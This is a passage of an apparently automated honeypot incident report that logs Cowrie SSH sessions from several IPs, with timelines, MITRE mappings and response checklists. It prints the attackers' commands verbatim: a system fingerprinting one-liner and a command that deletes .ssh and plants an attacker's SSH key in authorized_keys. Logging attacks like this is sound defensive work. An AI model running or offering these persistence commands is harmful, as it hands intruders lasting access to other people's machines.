| `2026-07-06 05:22:04` | `cowrie.client.version` |
| `2026-07-06 05:22:04` | `cowrie.client.kex` |
| `2026-07-06 05:22:07` | `cowrie.login.success` |
| `2026-07-06 05:22:09` | `cowrie.session.params` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:09` | `cowrie.command.success` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:09` | `cowrie.command.input` |
| `2026-07-06 05:22:10` | `cowrie.log.closed` |
| `2026-07-06 05:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374ac3936a75

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 05:22 |
| **Last Seen** | 2026-07-06 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:22:36` | `cowrie.session.connect` |
| `2026-07-06 05:22:36` | `cowrie.client.version` |
| `2026-07-06 05:22:36` | `cowrie.client.kex` |
| `2026-07-06 05:22:36` | `cowrie.login.success` |
| `2026-07-06 05:22:37` | `cowrie.session.params` |
| `2026-07-06 05:22:37` | `cowrie.command.input` |
| `2026-07-06 05:22:37` | `cowrie.log.closed` |
| `2026-07-06 05:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb909d1d2814

| Field | Detail |
|---|---|
| **Source IP** | `183.130.194[.]253` |
| **First Seen** | 2026-07-06 05:22 |
| **Last Seen** | 2026-07-06 05:27 |
| **Session Duration** | 274s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:22:38` | `cowrie.session.connect` |
| `2026-07-06 05:22:39` | `cowrie.client.version` |
| `2026-07-06 05:22:39` | `cowrie.client.kex` |
| `2026-07-06 05:22:41` | `cowrie.login.success` |
| `2026-07-06 05:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.130.194[.]253` to AbuseIPDB if not already reported
- [ ] Block `183.130.194[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b7a20d7e91d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:22 |
| **Last Seen** | 2026-07-06 05:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:22:50` | `cowrie.session.connect` |
| `2026-07-06 05:22:50` | `cowrie.client.version` |
| `2026-07-06 05:22:50` | `cowrie.client.kex` |
| `2026-07-06 05:22:54` | `cowrie.login.success` |
| `2026-07-06 05:22:56` | `cowrie.session.params` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:56` | `cowrie.command.success` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:56` | `cowrie.command.input` |
| `2026-07-06 05:22:57` | `cowrie.log.closed` |
| `2026-07-06 05:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c773864db1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:23 |
| **Last Seen** | 2026-07-06 05:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:23:35` | `cowrie.session.connect` |
| `2026-07-06 05:23:36` | `cowrie.client.version` |
| `2026-07-06 05:23:36` | `cowrie.client.kex` |
| `2026-07-06 05:23:39` | `cowrie.login.success` |
| `2026-07-06 05:23:41` | `cowrie.session.params` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:41` | `cowrie.command.success` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:41` | `cowrie.command.input` |
| `2026-07-06 05:23:42` | `cowrie.log.closed` |
| `2026-07-06 05:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c0b2bfe4e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:24 |
| **Last Seen** | 2026-07-06 05:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:24:22` | `cowrie.session.connect` |
| `2026-07-06 05:24:22` | `cowrie.client.version` |
| `2026-07-06 05:24:22` | `cowrie.client.kex` |
| `2026-07-06 05:24:26` | `cowrie.login.success` |
| `2026-07-06 05:24:28` | `cowrie.session.params` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.command.success` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.command.input` |
| `2026-07-06 05:24:28` | `cowrie.log.closed` |
| `2026-07-06 05:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-588f4f182001

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:25 |
| **Last Seen** | 2026-07-06 05:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:25:08` | `cowrie.session.connect` |
| `2026-07-06 05:25:09` | `cowrie.client.version` |
| `2026-07-06 05:25:09` | `cowrie.client.kex` |
| `2026-07-06 05:25:13` | `cowrie.login.success` |
| `2026-07-06 05:25:15` | `cowrie.session.params` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.command.success` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.command.input` |
| `2026-07-06 05:25:15` | `cowrie.log.closed` |
| `2026-07-06 05:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cf0c32e8198

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-06 05:25 |
| **Last Seen** | 2026-07-06 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:25:33` | `cowrie.session.connect` |
| `2026-07-06 05:25:33` | `cowrie.client.version` |
| `2026-07-06 05:25:33` | `cowrie.client.kex` |
| `2026-07-06 05:25:34` | `cowrie.login.success` |
| `2026-07-06 05:25:35` | `cowrie.session.params` |
| `2026-07-06 05:25:35` | `cowrie.command.input` |
| `2026-07-06 05:25:35` | `cowrie.log.closed` |
| `2026-07-06 05:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17183cd9df40

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:25 |
| **Last Seen** | 2026-07-06 05:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:25:56` | `cowrie.session.connect` |
| `2026-07-06 05:25:57` | `cowrie.client.version` |
| `2026-07-06 05:25:57` | `cowrie.client.kex` |
| `2026-07-06 05:26:00` | `cowrie.login.success` |
| `2026-07-06 05:26:03` | `cowrie.session.params` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.command.success` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.command.input` |
| `2026-07-06 05:26:03` | `cowrie.log.closed` |
| `2026-07-06 05:26:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ee1b32419d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:26 |
| **Last Seen** | 2026-07-06 05:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:26:43` | `cowrie.session.connect` |
| `2026-07-06 05:26:44` | `cowrie.client.version` |
| `2026-07-06 05:26:44` | `cowrie.client.kex` |
| `2026-07-06 05:26:47` | `cowrie.login.success` |
| `2026-07-06 05:26:49` | `cowrie.session.params` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:49` | `cowrie.command.success` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:49` | `cowrie.command.input` |
| `2026-07-06 05:26:50` | `cowrie.log.closed` |
| `2026-07-06 05:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a97319a7bce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:27 |
| **Last Seen** | 2026-07-06 05:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:27:30` | `cowrie.session.connect` |
| `2026-07-06 05:27:30` | `cowrie.client.version` |
| `2026-07-06 05:27:30` | `cowrie.client.kex` |
| `2026-07-06 05:27:34` | `cowrie.login.success` |
| `2026-07-06 05:27:36` | `cowrie.session.params` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:36` | `cowrie.command.success` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:36` | `cowrie.command.input` |
| `2026-07-06 05:27:37` | `cowrie.log.closed` |
| `2026-07-06 05:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c02ebc8102

| Field | Detail |
|---|---|
| **Source IP** | `110.93.224[.]226` |
| **First Seen** | 2026-07-06 05:27 |
| **Last Seen** | 2026-07-06 05:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:27:40` | `cowrie.session.connect` |
| `2026-07-06 05:27:40` | `cowrie.client.version` |
| `2026-07-06 05:27:40` | `cowrie.client.kex` |
| `2026-07-06 05:27:41` | `cowrie.login.success` |
| `2026-07-06 05:27:42` | `cowrie.session.params` |
| `2026-07-06 05:27:42` | `cowrie.command.input` |
| `2026-07-06 05:27:42` | `cowrie.command.failed` |
| `2026-07-06 05:27:43` | `cowrie.log.closed` |
| `2026-07-06 05:27:43` | `cowrie.session.params` |
| `2026-07-06 05:27:43` | `cowrie.command.input` |
| `2026-07-06 05:27:44` | `cowrie.session.file_download` |
| `2026-07-06 05:27:44` | `cowrie.log.closed` |
| `2026-07-06 05:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.93.224[.]226` to AbuseIPDB if not already reported
- [ ] Block `110.93.224[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-847d11cee2fd

| Field | Detail |
|---|---|
| **Source IP** | `110.93.224[.]226` |
| **First Seen** | 2026-07-06 05:27 |
| **Last Seen** | 2026-07-06 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:27:44` | `cowrie.session.connect` |
| `2026-07-06 05:27:44` | `cowrie.client.version` |
| `2026-07-06 05:27:44` | `cowrie.client.kex` |
| `2026-07-06 05:27:45` | `cowrie.login.success` |
| `2026-07-06 05:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.93.224[.]226` to AbuseIPDB if not already reported
- [ ] Block `110.93.224[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6b76461195b

| Field | Detail |
|---|---|
| **Source IP** | `110.93.224[.]226` |
| **First Seen** | 2026-07-06 05:27 |
| **Last Seen** | 2026-07-06 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:27:45` | `cowrie.session.connect` |
| `2026-07-06 05:27:45` | `cowrie.client.version` |
| `2026-07-06 05:27:46` | `cowrie.client.kex` |
| `2026-07-06 05:27:46` | `cowrie.login.success` |
| `2026-07-06 05:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.93.224[.]226` to AbuseIPDB if not already reported
- [ ] Block `110.93.224[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ae6de44852

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:28 |
| **Last Seen** | 2026-07-06 05:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:28:18` | `cowrie.session.connect` |
| `2026-07-06 05:28:18` | `cowrie.client.version` |
| `2026-07-06 05:28:18` | `cowrie.client.kex` |
| `2026-07-06 05:28:22` | `cowrie.login.success` |
| `2026-07-06 05:28:24` | `cowrie.session.params` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:24` | `cowrie.command.success` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:24` | `cowrie.command.input` |
| `2026-07-06 05:28:25` | `cowrie.log.closed` |
| `2026-07-06 05:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81d337349ddd

| Field | Detail |
|---|---|
| **Source IP** | `207.154.250[.]9` |
| **First Seen** | 2026-07-06 05:28 |
| **Last Seen** | 2026-07-06 05:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
